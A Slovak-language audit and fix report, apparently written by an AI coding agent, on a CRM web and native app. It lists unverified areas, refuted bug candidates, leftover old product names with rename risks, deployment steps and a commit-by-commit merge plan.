**NEOVERENÉ:**

- **Serverové Jest testy (`server/npm test`)** — v tomto prostredí sa nedajú spustiť. `mongodb-memory-server` sťahuje binárku MongoDB z `fastdl.mongodb.org` a sieťová politika prostredia tento hostiteľ blokuje (HTTP 403). Žiadny serverový test teda nebol spustený pred zmenami ani po nich. Pred zlúčením serverových častí ich spustite lokálne (`cd server && npm test`). Opravujúci agenti pri každej zmene čítali príslušné testy v `server/__tests__` a zmeny s nimi zladili, ale to nie je náhrada za beh.
- **Nezávislá kontrola commitov** — 82 klientských commitov (jadro, CRM, správy, úlohy, verejné stránky, CSS) schválil nezávislý kontrolór bez výhrad. Ostatných 40 klientských commitov (notifikácie/prostredia, admin panel a 3 doplnkové) a všetkých 162 serverových commitov nezávislý kontrolór neskontroloval, lebo kontrolní agenti opakovane narazili na limit relácie. Prešiel som ich sám: celé diffy klientských skupín, pri serveri syntax, načítanie modulov, dymový test a cielené čítanie diffov, ktoré menia stavové kódy, validáciu vstupov, autorizáciu, sokety a streamovanie z R2. Je to menej dôkladné ako nezávislý review, preto pred zlúčením serverových častí odporúčam code review.
- **Nálezy na schválenie označené „neoverené"** — 82 z nich nemalo nezávislé adverzárne overenie (overovatelia padli na limit). Všetky vysoké z nich som ručne potvrdil v kóde (označené „overené ručne"); stredné a nízke treba pred opravou overiť.
- Správanie proti reálnej MongoDB/Atlas (indexy, výkon dotazov, race conditions), Stripe/Apple webhookom, Google OAuth/Calendar/Tasks, FCM/APNs/Web Push, SMTP a Cloudflare R2 — vyžaduje externé služby a tajomstvá.
- Natívne aplikácie (Kotlin/Swift) neboli kompilované; ich nálezy sú len z čítania kódu.
- Vizuálne overenie CSS zmien na reálnych zariadeniach (iPhone s výrezom, iPad, Android, skladacie telefóny) — build prešiel, ale vzhľad treba skontrolovať ručne.

**Kandidáti vyvrátení pri overení (7)** — nie sú to chyby, uvádzam ich, aby sa k nim nikto nevracal:

- `client/src/App.jsx:492` — Fallback v handleri NOTIFICATION_CLICK vola url.startsWith() bez kontroly typu - pri chybajucej url TypeError: Kód na App.jsx:491-493 by pri `url === undefined` naozaj hodil TypeError, ale scenár nenastáva: jediný odosielateľ správy NOTIFICATION_CLICK je client/public/sw-push.js:138-143, ktorý vždy posiela `url: urlToOpen` – reťazec z sanitizeNotif…
- `client/src/components/FilePreviewModal.jsx:93` — blob.text() bez fallbacku pre staršie WebKity, hoci uploadQueue takýto fallback má: Baseline projektu `Blob.prototype.text()` má: client/vite.config.js nenastavuje build.target (r. 82-96 len chunkSizeWarningLimit a manualChunks), takže platí Vite 5 default `modules` = Safari ≥ 14, Chrome ≥ 87, Firefox ≥ 78 — Blob.text() e…
- `client/src/components/TaskList.jsx:41` — TaskList: toggle/delete handlery potichu zhltnú chybu — používateľ nedostane spätnú väzbu: Prázdne catch bloky v TaskList.jsx:41-43, 51-53, 78-80, 87-89 existujú, ale komponent nie je nikde v aplikácii pripojený: `TaskList` importuje len client/src/components/ContactDetail.jsx:2 (použitie r. 291) a `ContactDetail` nie je importo…
- `client/src/context/AuthContext.jsx:256` — Hodnota AuthContext a jej funkcie sa vytvaraju pri kazdom renderi providera: Kód sedí (AuthContext.jsx:256-266 nový objekt, login/register/loginWithToken/logout/updateUser nové funkcie každý render), ale uvádzaný dopad neplatí: AuthProvider sa re-renderuje VÝLUČNE pri zmene vlastného stavu (user, token, loading – r…
- `client/src/pages/WorkspaceMembers.jsx:473` — Tlačidlo odstránenia člena (~34 px) a select roly s 12 px písmom nie sú vhodné na dotyk: Vyvrátené po prečítaní client/src/styles/index.css: blok `@media (hover: none) and (pointer: coarse)` (:8177-8190) dáva `button { min-height/min-width: 44px }` a `.btn-icon, .btn-icon-sm { min-height/min-width: 40px }` → `.wm-remove-btn` m…
- `client/src/utils/fileDownload.js:80` — Starý iOS shell bez handlera fileDownload spadne do web vetvy, ktorá je vo WKWebView tichý no-op: Handler `fileDownload` je v iOS shelli registrovaný spolu s `iosNative` od úplne prvého commitu adresára ios/ (c675896, 2026-07-29): `git show c675896:ios/PrplCRM/ContentView.swift` r. 282 (`name: "fileDownload"`) a 714 (`if message.name =…
- `server/services/adminEmailService.js:310` — E-mail na obnovenie hesla sa nikdy neodošle — ReferenceError na nedeklarovanú premennú `html`: Problém v aktuálnom strome NEEXISTUJE — bol opravený v HEAD commite 3c70664 (2026-10-02 09:17, „fix(email): e-mail na obnovenie hesla sa nikdy neodoslal“). server/services/adminEmailService.js:312 teraz deklaruje `const html = wrapEmail({ …

## 6. Zostávajúce staré názvy (purple-crm / Perun) — NEPREMENOVANÉ

Vyhľadané cez `git grep -n -i -E 'purple[- ]?crm|perun'` (bez package-lock, PNG a binárnych súborov). „Perun Electromobility s.r.o.“ je obchodné meno prevádzkovateľa a „eperun.sk“ sú e-maily vlastníka, nie názvy produktu; uvádzam ich kvôli úplnosti. Hostiteľ `perun-crm-api.onrender.com` je **živý produkčný API host** zapečený v natívnych appkách aj v registráciách u tretích strán (Google OAuth, Apple Sign in, App Store Server Notifications, Google Calendar webhook). Jeho premenovanie vyžaduje koordinovaný release, nie len úpravu kódu.

### Konfigurácia, URL a identifikátory (22)

| Súbor:riadok | Výskyt | Poznámka k premenovaniu |
|---|---|---|
| `android-native/app/src/main/res/values/strings.xml:14` | `<string name="api_base_url">https://perun-crm-api.onrender.com</string>` | RIZIKOVÉ – živý produkčný API host, ktorý používajú natívne OkHttp volania (FCM register, Block Store restore, natívne error reporty). Zmena vyžaduje nový host/redirect + nový Android release; staré inštalácie by prestali registrovať push. |
| `client/.env.production:1` | `VITE_API_URL=https://perun-crm-api.onrender.com` | RIZIKOVÉ – živý API host pre celý webový klient (axios, reportError, Socket.io). Zmena vyžaduje existujúci nový host, úpravu CORS_ORIGIN/API_PUBLIC_HOST na serveri a CSP connect-src. |
| `client/public/.well-known/apple-app-site-association:6` | `"appID": "Q4KXURZ973.sk.perunelectromobility.prplcrm",` | RIZIKOVÉ – App ID (Team ID + bundle ID `sk.perunelectromobility.prplcrm`) pre Universal Links; bundle ID živej appky sa meniť nedá bez novej appky v App Store. |
| `ios/PrplCRM.xcodeproj/project.pbxproj:294` | `PRODUCT_BUNDLE_IDENTIFIER = sk.perunelectromobility.prplcrm;` | RIZIKOVÉ – iOS bundle id (Debug konfigurácia). Nedá sa zmeniť bez novej appky v App Store; viazané na APNs topic, Keychain service, AASA appID, Sign in with Apple, IAP a GoogleService-Info.plist. |
| `ios/PrplCRM.xcodeproj/project.pbxproj:326` | `PRODUCT_BUNDLE_IDENTIFIER = sk.perunelectromobility.prplcrm;` | RIZIKOVÉ – iOS bundle id (Release konfigurácia); rovnaké dôvody ako riadok 294. |
| `ios/PrplCRM/ContentView.swift:1551` | `guard host.lowercased() == "perun-crm-api.onrender.com" else { return false }` | RIZIKOVÉ – živý API host v novej výnimke navigácií (`/api/auth/`, `/api/attachments/`) vo WebView; meniť spolu s ostatnými natívnymi výskytmi a novým iOS buildom. |
| `ios/PrplCRM/GoogleService-Info.plist:12` | `<string>sk.perunelectromobility.prplcrm</string>` | RIZIKOVÉ – BUNDLE_ID v Google/Firebase konfigurácii; musí sedieť s bundle id appky a Google OAuth iOS klientom. |
| `ios/PrplCRM/OAuthController.swift:42` | `static let backendBaseURL = "https://perun-crm-api.onrender.com"` | RIZIKOVÉ – živý API host pre natívny OAuth POST /api/auth/{google\|apple}/native a natívne error reporty; zmena = nový iOS release. |
| `ios/PrplCRM/PrplCRMApp.swift:152` | `static let baseURL = "https://perun-crm-api.onrender.com"` | RIZIKOVÉ – živý API host pre registráciu APNs device tokenu; zmena = nový iOS release, inak iOS push prestane fungovať. |
| `render.yaml:88` | `value: "default-src 'self'; script-src 'self' 'unsafe-inline' https://www.googletagmanage…` | RIZIKOVÉ – API host v CSP (connect-src, media-src, report-uri); meniť spolu s `VITE_API_URL`, inak CSP zablokuje volania API. |
| `server/.env.example:38` | `# Authorized redirect URIs: https://perun-crm-api.onrender.com/api/auth/google/callback` | Príkladová konfigurácia (komentár) – odráža redirect URI registrovanú v Google Cloud Console. Kozmetické v súbore, rizikové v realite. |
| `server/.env.example:41` | `GOOGLE_OAUTH_REDIRECT_URI=https://perun-crm-api.onrender.com/api/auth/google/callback` | Príkladová hodnota – musí sedieť s Google Cloud Console; zmena bez úpravy Console rozbije Google login. |
| `server/.env.example:54` | `APPLE_SERVICE_ID=sk.perunelectromobility.prplcrm.signin` | RIZIKOVÉ – Apple Service ID (audience pre web Sign in with Apple), registrované u Apple; nemeniť. |
| `server/.env.example:55` | `APPLE_APP_BUNDLE_ID=sk.perunelectromobility.prplcrm` | RIZIKOVÉ – bundle id ako audience pre natívny iOS Sign in with Apple; nemeniť. |
| `server/.env.example:56` | `APPLE_OAUTH_REDIRECT_URI=https://perun-crm-api.onrender.com/api/auth/apple/callback` | RIZIKOVÉ – Return URL registrovaná v Apple Developer (Service ID); zmena bez úpravy u Apple rozbije web Apple login. |
| `server/index.js:111` | `const apiHost = process.env.API_PUBLIC_HOST \|\| 'perun-crm-api.onrender.com';` | RIZIKOVÉ – default pre CSP connect-src (https/wss). Ak sa zmení bez nastavenia API_PUBLIC_HOST na Renderi, CSP zablokuje vlastné API/WebSocket. |
| `server/routes/auth-apple.js:47` | `'https://perun-crm-api.onrender.com/api/auth/apple/callback';` | RIZIKOVÉ – default Apple OAuth redirect URI (autentifikačný tok, Return URL registrovaná u Apple); nemeniť bez zmeny u Apple a env. |
| `server/routes/auth-google.js:40` | `'https://perun-crm-api.onrender.com/api/auth/google/callback';` | RIZIKOVÉ – default Google OAuth redirect URI (autentifikačný tok, registrované v Google Cloud Console). |
| `server/routes/googleCalendar.js:29` | `const GOOGLE_REDIRECT_URI = process.env.GOOGLE_REDIRECT_URI \|\| 'https://perun-crm-api.o…` | RIZIKOVÉ – OAuth redirect pre Google Calendar integráciu, registrované v Google Console. |
| `server/routes/googleCalendar.js:803` | `const WEBHOOK_BASE_URL = process.env.API_BASE_URL \|\| 'https://perun-crm-api.onrender.co…` | RIZIKOVÉ – adresa pre Google Calendar push notifications (watch channel); zmena bez nového hostu zastaví synchronizáciu kalendára. |
| `server/routes/googleTasks.js:30` | `const GOOGLE_TASKS_REDIRECT_URI = process.env.GOOGLE_TASKS_REDIRECT_URI \|\| 'https://per…` | RIZIKOVÉ – OAuth redirect pre Google Tasks, registrované v Google Console. |
| `server/services/appleIap.js:37` | `const BUNDLE_ID = process.env.APPLE_IAP_BUNDLE_ID \|\| 'sk.perunelectromobility.prplcrm';` | RIZIKOVÉ – bundle id pre verifikáciu Apple IAP transakcií a ASSN (platobná logika); nemeniť. |

### Identifikátory v kóde (4)

| Súbor:riadok | Výskyt | Poznámka k premenovaniu |
|---|---|---|
| `ios/PrplCRM/KeychainHelper.swift:6` | `private static let service = "sk.perunelectromobility.prplcrm"` | RIZIKOVÉ – Keychain service reťazec. Zmena = existujúci používatelia stratia uložený token (odhlásenie, Face ID zámok sa neaktivuje) bez migrácie. |
| `server/models/APNsDevice.js:17` | `default: 'sk.perunelectromobility.prplcrm'` | RIZIKOVÉ – default v Mongoose schéme (DB schéma – mimo rozsahu úprav) a musí sedieť s APNS_TOPIC; nemeniť. |
| `server/routes/googleTasks.js:344` | `taskLists.find(list => list.title === 'Prpl CRM' \|\| list.title === 'Perun CRM');` | RIZIKOVÉ odstrániť – spätná kompatibilita: používatelia so starým Google Tasks zoznamom „Perun CRM“ by po odstránení dostali nový duplicitný zoznam a stratili prepojenie úloh. Ponechať. |
| `server/services/notificationService.js:83` | `const APNS_TOPIC = 'sk.perunelectromobility.prplcrm';` | RIZIKOVÉ – apns-topic MUSÍ byť bundle id iOS appky, inak APNs odmietne push (BadTopic). Nemeniť. |

### Text viditeľný používateľom (1)

| Súbor:riadok | Výskyt | Poznámka k premenovaniu |
|---|---|---|
| `client/index.html:150` | `"alternateName": "Purple CRM",` | JSON-LD SEO alias na starý názov – zámerný (pomáha dopytom „Purple CRM“). Kozmetické z pohľadu kódu, ale odstránenie je produktové/SEO rozhodnutie. |

### Komentáre (9)

| Súbor:riadok | Výskyt | Poznámka k premenovaniu |
|---|---|---|
| `android-native/app/src/main/java/eu/prplcrm/app/NativeErrorReporter.kt:20` | `* ⚠️ POST ide na api_base_url (perun-crm-api.onrender.com), NIE na prplcrm.eu —` | Kozmetické – komentár odkazujúci na živý API host. |
| `android-native/app/src/main/res/values/strings.xml:11` | `perun-crm-api.onrender.com (Render web service). Toto používajú natívne` | Kozmetické – komentár, ale popisuje živý host; meniť až spolu s riadkom 14. |
| `client/src/styles/index.css:12353` | `kde hrozí overflow (do 480px). Bez tohto "Perun Electromobility" tečie` | Kozmetické – názov firemného workspace použitý ako príklad dlhého textu v CSS komentári. |
| `client/src/utils/reportError.js:241` | `// perun-crm-api.onrender.com. Relatívna /api/errors/client by` | Kozmetické – komentár vysvetľujúci, prečo musí byť absolútna URL (živý host). |
| `ios/PrplCRM/OAuthController.swift:536` | `// ⚠️ MUSÍ ísť na API doménu (perun-crm-api.onrender.com), NIE prplcrm.eu —` | Kozmetické – komentár. |
| `server/config/appleProducts.js:9` | `* natvrdo, nie v env vars. Bundle ID appky je sk.perunelectromobility.prplcrm,` | Kozmetické – komentár; product ID `prplcrm.*` už sú v novom názve. |
| `server/routes/auth-apple.js:44` | `// Backend hostname je perun-crm-api.onrender.com (match s ostatnými Google` | Kozmetické – komentár. |
| `server/routes/auth-google.js:37` | `// Backend hostname je perun-crm-api.onrender.com (rovnaký pattern ako pre` | Kozmetické – komentár. |
| `server/services/appleIap.js:18` | `*   APPLE_IAP_BUNDLE_ID      — sk.perunelectromobility.prplcrm (default)` | Kozmetické – komentár. |

### Testy (12)

| Súbor:riadok | Výskyt | Poznámka k premenovaniu |
|---|---|---|
| `server/__tests__/models/APNsDevice.test.js:15` | `*   - bundleId default = 'sk.perunelectromobility.prplcrm' (produkčný` | Komentár v teste – kozmetické, meniť spolu s modelom. |
| `server/__tests__/models/APNsDevice.test.js:57` | `expect(dev.bundleId).toBe('sk.perunelectromobility.prplcrm'); // default` | Test overuje default v DB schéme (server/models/APNsDevice.js:17) – meniť len spolu so schémou (čo je mimo rozsahu). |
| `server/__tests__/routes/googleTasks.test.js:246` | `it('rozpozná aj starý názov "Perun CRM" a použije ho', async () => {` | Test spätnej kompatibility so starým názvom Google Tasks zoznamu – ponechať, kým existuje fallback v googleTasks.js:304. |
| `server/__tests__/routes/googleTasks.test.js:248` | `data: { items: [{ id: 'legacy-list', title: 'Perun CRM' }] }` | Fixture pre legacy názov zoznamu – ponechať spolu s riadkom 223. |
| `server/__tests__/routes/googleTasks.test.js:552` | `_createGoogleTaskData({ title: 'Zavolať klienta' }, 'Perun Electromobility');` | Kozmetické – názov firemného workspace ako testovací fixture (prefix [Workspace]). |
| `server/__tests__/routes/googleTasks.test.js:552` | `'Perun Electromobility'` | Kozmetické – testovací fixture. |
| `server/__tests__/routes/googleTasks.test.js:553` | `expect(result.title).toBe('[Perun Electromobility] Zavolať klienta');` | Kozmetické – testovací fixture. |
| `server/__tests__/routes/googleTasks.test.js:553` | `expect(result.title).toBe('[Perun Electromobility] Zavolať klienta');` | Kozmetické – testovací fixture. |
| `server/__tests__/routes/googleTasks.test.js:558` | `{ title: '[Perun Electromobility] Zavolať klienta' },` | Kozmetické – testovací fixture. |
| `server/__tests__/routes/googleTasks.test.js:559` | `'Perun Electromobility'` | Test spätnej kompatibility s legacy názvom zoznamu „Perun CRM“ / názvom workspace v teste — ponechať, kým kód legacy názov podporuje. |
| `server/__tests__/routes/googleTasks.test.js:561` | `expect(result.title).toBe('[Perun Electromobility] Zavolať klienta');` | Test spätnej kompatibility s legacy názvom zoznamu „Perun CRM“ / názvom workspace v teste — ponechať, kým kód legacy názov podporuje. |
| `server/__tests__/routes/push.test.js:324` | `{ userId: ctx.user._id, deviceToken: myToken, bundleId: 'sk.perunelectromobility.prplcrm'…` | Fixture s produkčným bundle id – meniť len spolu s modelom/APNS_TOPIC. |

### Dokumentácia (6)

| Súbor:riadok | Výskyt | Poznámka k premenovaniu |
|---|---|---|
| `docs/apple-iap-setup.md:89` | `https://perun-crm-api.onrender.com/api/billing/apple/notifications` | Dokumentácia, ale zrkadlí Production Server URL nastavenú v App Store Connect (ASSN V2). Zmena hostu vyžaduje zmenu v ASC. |
| `docs/apple-iap-setup.md:93` | `https://perun-crm-api.onrender.com/api/billing/apple/notifications` | Dokumentácia – Sandbox Server URL v App Store Connect; rovnaké riziko ako riadok 89. |
| `docs/apple-iap-setup.md:108` | `\| APPLE_IAP_BUNDLE_ID \| sk.perunelectromobility.prplcrm \|` | Dokumentácia hodnoty env var – odráža skutočný iOS bundle id, ktorý sa meniť nedá (viazaný na App Store záznam). |
| `docs/apple-iap-setup.md:115` | `[AppleIAP] Configured { bundleId: 'sk.perunelectromobility.prplcrm', rootCerts: 3 }` | Dokumentácia očakávaného logu – kozmetické. |
| `docs/cloudflare-r2-setup.md:182` | `- Po 24h by si mal mať peruncrm na ~30-50 MB namiesto 466 MB` | Dokumentácia – `peruncrm` je názov MongoDB Atlas databázy/clusteru. V docs kozmetické; samotný názov DB je rizikový meniť (migrácia dát, MONGODB_URI). |
| `docs/superpowers/plans/2026-09-02-play-zero-tap-block-store.md:762` | `curl -s https://perun-crm-api.onrender.com/api/version … curl -s -X POST https://perun-cr…` | Kozmetické – overovací postup v pláne odkazuje na živý host. |

### Právne texty (obchodné meno prevádzkovateľa) (7)

| Súbor:riadok | Výskyt | Poznámka k premenovaniu |
|---|---|---|
| `client/public/ochrana-udajov.html:112` | `<li><strong>Obchodné meno:</strong> Perun Electromobility s.r.o.</li>` | Obchodné meno prevádzkovateľa (firma vlastníka), NIE názov produktu – nemeniť v rámci renamingu. |
| `client/public/ochrana-udajov/index.html:112` | `<li><strong>Obchodné meno:</strong> Perun Electromobility s.r.o.</li>` | Obchodné meno prevádzkovateľa – právny text, nemeniť. |
| `client/public/vop.html:103` | `<li><strong>Obchodné meno:</strong> Perun Electromobility s.r.o.</li>` | Obchodné meno prevádzkovateľa – právny text, nemeniť. |
| `client/public/vop/index.html:103` | `<li><strong>Obchodné meno:</strong> Perun Electromobility s.r.o.</li>` | Obchodné meno prevádzkovateľa – právny text, nemeniť. |
| `client/src/pages/PrivacyPolicy.jsx:47` | `<li><strong>Obchodné meno:</strong> Perun Electromobility s.r.o.</li>` | Obchodné meno prevádzkovateľa – právny text, nemeniť. |
| `client/src/pages/TermsOfService.jsx:53` | `<li><strong>Obchodné meno:</strong> Perun Electromobility s.r.o.</li>` | Obchodné meno prevádzkovateľa – právny text, nemeniť. |
| `server/utils/planLimits.js:15` | `const LEGACY_PRO_EMAILS = ['project.manager@eperun.sk', 'martin.kosco@eperun.sk'];` | E-maily vlastníka (nie názov produktu) v dočasnom fallbacku `PRO_EMAILS`; odstrániť po nastavení premennej na Renderi (kapitola 7 A2). |

## 7. Akcie pre prevádzku (pred a po nasadení druhej vlny)

Tieto kroky z kódu urobiť nejde — vyžadujú prístup k Renderu, MongoDB Atlas, App Store Connect a Google Play. Hodnoty tajomstiev v reporte nie sú.

**A. Pred nasadením servera (druhá vlna)**

1. **Duplicity `appleOriginalTransactionId`** — nový unique index `uniq_apple_original_tx` (`server/models/User.js:434`) sa pri duplicitách nevytvorí (Mongoose zaloguje chybu, server beží ďalej, ale ochrana chýba). Overte v Atlas / mongosh, že dotaz nevráti nič:
   ```js
   db.users.aggregate([
     { $match: { 'subscription.appleOriginalTransactionId': { $type: 'string' } } },
     { $group: { _id: '$subscription.appleOriginalTransactionId', n: { $sum: 1 }, ids: { $push: '$_id' } } },
     { $match: { n: { $gt: 1 } } }
   ])
   ```
   Ak niečo vráti, rozhodnite, ktorému účtu predplatné patrí, a pri ostatných pole vynulujte.
2. **`PRO_EMAILS`** (Render → prpl-crm-api → Environment) — čiarkou oddelený zoznam e-mailov s Pro bypassom. Kým nie je nastavená, server použije pôvodný zoznam z kódu a zaloguje varovanie (`server/utils/planLimits.js:15`). Po nastavení pôvodný zoznam z kódu odstráňte.
3. **`GOOGLE_WEBHOOK_SECRET`** — náhodný reťazec ≥ 32 znakov. Bez neho sa Google Calendar webhooky prijímajú len podľa `channelId` (`server/routes/googleCalendar.js:1299`). **Po nastavení** treba existujúce kanály (vytvorené bez tokenu) obnoviť, inak ich notifikácie budú odmietnuté až do bežnej obnovy (dni):
   ```js
   db.users.updateMany({ 'googleCalendar.enabled': true },
     { $set: { 'googleCalendar.watchExpiry': new Date(0) } })
   db.users.updateMany({ 'googleCalendar.workspaceWatches.0': { $exists: true } },
     { $set: { 'googleCalendar.workspaceWatches.$[].expiry': new Date(0) } })
   ```
   Kanály sa potom obnovia pri najbližšom behu `renewCalendarWatches` (každých 6 h po štarte).
4. Voliteľné: `APPLE_SANDBOX_POLICY=allowlist` + `APPLE_SANDBOX_ALLOWED_EMAILS` (predvolene sa sandbox nákupy prijímajú — App Review ich potrebuje), `CLIENT_ERROR_NEW_FP_PER_IP` (predvolene 20 nových druhov klientskych chýb z jednej IP za hodinu).

**B. Nasadenie**

5. Server a web nasaďte **v rovnakom okne** (Render oba z vetvy). Prihlásenia/prepojenia účtov rozbehnuté počas deployu môžu raz zlyhať (nový AuthCallback vyžaduje nonce z nového OAuthButtons) — stačí ich zopakovať. Staré JWT ostávajú platné.
6. Pri štarte servera prebehnú jednorazové migrácie (`app_migrations`): okrem existujúcich aj `drop_redundant_indexes_v1` (zruší redundantné indexy v 8 kolekciách) a vytvoria sa nové indexy (Stripe/Google/Apple polia v `users`, Stripe ID v `promocodes`, `invitations {email, status}`, čiastočný index `messages.linkedId`). Na Atlase sledujte, či build indexov prebehol (Atlas → Collections → Indexes).
7. **render.yaml** — hlavičky statického webu (X-Frame-Options, nosniff, Referrer-Policy, Permissions-Policy, CSP report-only) platia len ak je služba `prpl-crm` spravovaná Blueprintom. Overte po deployi: `curl -sI https://prplcrm.eu/app | grep -i -E 'content-security|x-frame'`. Ak chýbajú, pridajte ich v Render dashboarde (Static Site → Headers). Neoverené z tohto prostredia (render.com je blokovaný).

**C. Po nasadení**

8. **CSP** — ~2 týždne sledujte v Diagnostike (Admin → Chyby) záznamy `CSPViolation`. Legitímne zdroje doplňte do politiky v `render.yaml`, potom hlavičku premenujte z `Content-Security-Policy-Report-Only` na `Content-Security-Policy`.
9. **Heslá zo skriptov** — účty, ktoré kedysi vytvorili `seed-admin.js`, `fix-index-and-create-admin.js` alebo `restore-user.js` (super admin a obnovený účet), majú heslo, ktoré je v git histórii. Zmeňte ich (napr. `SEED_ADMIN_PASSWORD=… node scripts/seed-admin.js`, alebo cez „Zabudnuté heslo“) — zmena hesla zneplatní aj všetky ich relácie.
10. Sledujte v Diagnostike nové názvy: `iOSKeyboardFixSelectorMissing`, `AndroidRestoreTokenIssueFailed` a odpovede 409 z `/api/billing/apple/verify` (transakcia viazaná na iný účet).

**D. Natívne appky — nové vydanie**

11. **iOS** (App Store): build v Xcode (kód nebol kompilovaný — neoverené), potom otestovať: prihlásenie Google/Apple (natívne SDK), prihlásenie cez Safari → `prplcrm://auth` (studený aj teplý štart), odhlásenie → reload nesmie obnoviť session, nákup + obnova IAP (sandbox), Face ID po > 5 min na pozadí, ZIP export, odkaz na cudziu doménu musí otvoriť Safari. Zvýšiť `CFBundleVersion`. Nové Info.plist kľúče a Privacy Manifest sú súčasťou buildu.
12. **Android** (Google Play): build Gradle (kód nebol kompilovaný — neoverené), otestovať prihlásenie, deep link z notifikácie počas splashu, odhlásenie (push predošlého účtu už nesmie prísť), sťahovanie prílohy na Android 7–9 (share sheet) a 10+, odkaz na cudziu doménu. Zvýšiť `versionCode`.
13. Legacy TWA (`android/`) sa zmení až po prebuildovaní Bubblewrapom — ak sa už nevydáva, nie je potrebné nič robiť.

## 8. Ako zmergovať po častiach

### Prvá vlna (commity do `a0c9fbe`)

Vetva `claude/audit-fixes` obsahuje všetky opravy ako samostatné commity nad `main` (`7ae8aae`). Každá oblasť nižšie sa dá aplikovať na `main` samostatne bez konfliktov (overené skúšobným `git cherry-pick` každej oblasti na čistý `main`). Odporúčam zlučovať po jednej oblasti, nasadiť, pár hodín sledovať Diagnostiku a až potom pokračovať.

**Jednorazová príprava:**

```bash
git fetch origin
git checkout main && git pull
```

**Postup pre jednu oblasť** (príklad pre prvú časť; SHA zoznamy sú v tabuľke):

```bash
git checkout -b merge/S8-emaily origin/main
git cherry-pick <sha1> <sha2> …   # v poradí z tabuľky
cd client && npx vitest run && npm run build && git checkout -- dist dev-dist   # pri klientských častiach
cd ../server && npm test   # pri serverových častiach (potrebuje MongoDB binárku)
git push -u origin merge/S8-emaily   # potom PR do main
```

Alternatíva pre celé zlúčenie naraz: PR z `claude/audit-fixes` do `main` (všetky commity sú lineárne nad `main`, konflikty nie sú).

**Odporúčané poradie** (od najväčšieho prínosu a najmenšieho rizika):

| # | Časť | Commity | Riziko | SHA (v poradí cherry-pick) |
|---|---|---|---|---|
| 1 | **S8** Server – e-maily, affiliate, kontaktný formulár, oznámenia, joby — vrátane kritickej opravy e-mailu na obnovu hesla (prvý commit vetvy) | 12 | nízke | `3c706641 129b3640 7b816d2f 6de38af4 f2d2216a 2ce0c0ea de5e4c7f 4d94e9c1 f222d225 37a2b455 9306914a 3816cff0` |
| 2 | **K3** Klient – jadro (App, WorkspaceContext, socket, diagnostika, formátovanie) | 18 | nízke | `1bae4cf5 5611a979 78e34d06 0f78581a 44d09f52 dd3ae0b8 f5f42108 5abcbc0e 83f0ee5b faf3295f bc6037fa c0527aae 6504419c f1b2cec1 72b99fe1 5a894a94 f9bfe8b3 3e475417` |
| 3 | **K2** Klient – notifikácie, push, prostredia, pozvánky, UserMenu | 22 | nízke | `fe96453d 93584beb 5bd24a61 63c4c21e a0054502 1546167f ba719485 9376d0fd 62e9eb8b 80f9b80b 3ed4397c 1f36f1ce 46630072 ec79c47f 3e463132 abfad5d2 919f2e28 f81beea5 2843bd41 6dc316c8 7c404b51 47e0d8d0` |
| 4 | **K4** Klient – CRM, prílohy, sťahovanie, upload fronta | 18 | nízke | `b9baf42f ff5e2e48 d9d8b3fc 993b4ee2 2af13d9d e8a2a4ca d811f339 ecfd8889 0572c6f3 d4c0049d 2b091954 22172553 d20a5853 edd18a44 fa758904 be88a64b ce47574e 9ed22ed5` |
| 5 | **K6** Klient – projekty a úlohy | 11 | nízke | `d5af8c84 a0b609f2 d84fa473 24b8ff3a 7f077994 e6b85cff 31d939ac bd908479 e1583026 4d084b97 51d70d19` |
| 6 | **K5** Klient – správy, dashboard, oznámenia, nápoveda | 17 | nízke | `351f76d8 4409934a 6cbcb4e7 72b96be0 6840ad12 60688c4c 9fa32b87 ff1616f2 edf20e10 231c6e57 4143071c 4efe6592 1d46a769 60b01fc4 1d4e2438 cbc7abd0 773a5418` |
| 7 | **K1** Klient – SuperAdmin panel | 15 | nízke (len admin) | `51b0ae68 2b7479e9 1566be9b 82161922 dbbd8c85 55527b6a ccbe8b5b 9e548be9 b5ae6096 c571173e 62fcfb9c 4c2a709d 1ed64564 40183892 b8d852aa` |
| 8 | **K7** Klient – landing, VOP, affiliate stránka | 6 | nízke | `f8e9b5c5 1d216268 76d2614b d22d2633 f1164cf5 1988d89e` |
| 9 | **K8** Klient – CSS (safe-area, dotykové ciele, reduced-motion), robots.txt | 14 | nízke–stredné (vizuálne, otestovať na iPhone/Android) | `18ff444a cdee2016 1c8f9fe1 b755f6de cdce137b 2dbde661 48672bf3 151565d4 36d52145 b817726f c673ee30 ffa76b15 ed88eb5c 82cf4315` |
| 10 | **K9** Klient – odstránenie mŕtveho Toast komponentu | 1 | nízke | `9d686ac5` |
| 11 | **S3** Server – jadro (CORS, body limity, error handler, sokety, shutdown, rate limit, Diagnostika) | 18 | stredné (CORS, poradie middleware, sokety) | `6d9eba6d f579ce3c e9f5bbf4 29797554 aa4e7477 99495ae0 39eadc92 62b901df 90625fbd 7ab44a82 adc2114c 83ecb6e0 145c382d 5f2bfd57 36325d0f 9c0ac33f e6911e59 4ef44dcc` |
| 12 | **S1** Server – prostredia, stránky, notifikácie API, push API | 23 | stredné (nové 400 pri nevalidných vstupoch) | `8fd92b54 19e175c1 09b68813 e1d6a99d e9aaad10 3671970d d0afe55d cb0060de cbafd155 85a060e2 e3d3eddc 7daca7be 6c894235 83da3b9f 291d440f 51f6aa76 6bdcd35c dba9a683 045886b2 69da3c46 767b1e9a 0efa115e ac530779` |
| 13 | **S4** Server – úlohy/projekty API | 16 | stredné (assignedTo len pre členov) | `372da56a c2024c02 f7ef4b09 35b19c29 6d65e491 f9838d30 b6bad2fb e2eea531 b32d59f2 b8685f63 e41b2215 e8b56a17 15eee668 cb3a57a7 63ae748d 73d4691a` |
| 14 | **S5** Server – kontakty, prílohy, R2 úložisko | 18 | stredné (streamovanie z R2, validácia polí) | `c2a34442 852f43b8 026b76f8 6631bc9d 281680e5 3443aa3d 2e39d3b4 733377ab 733db38c f9e3b70f e9d85124 e50be881 e31f3244 7f6dab5e 7036ab0f 6672038b c237809e 560b9db7` |
| 15 | **S6** Server – správy API | 13 | nízke–stredné | `59118b12 a6897428 6e5175c9 fc989db7 05a7b9d8 6e30f961 6d707390 f1a8b673 d97926ed 0bf3146c 64a6c0c3 07ade1be 87aacaf1` |
| 16 | **S9** Server – notifikačné služby, push (APNs/FCM/web push), plánovač termínov | 19 | stredné (časové pásmo pripomienok, push) | `852ee9e8 afafb8db 03ecd021 b434dd78 a9b7e8c7 ffc2d40f 9ef6df77 01d847ed e68034c7 f26eaf5a ff89f824 5831dd8b f5fa0729 d02aa514 904aa902 8ccba7e1 4ac8b068 11ac42c9 a8f93a8f` |
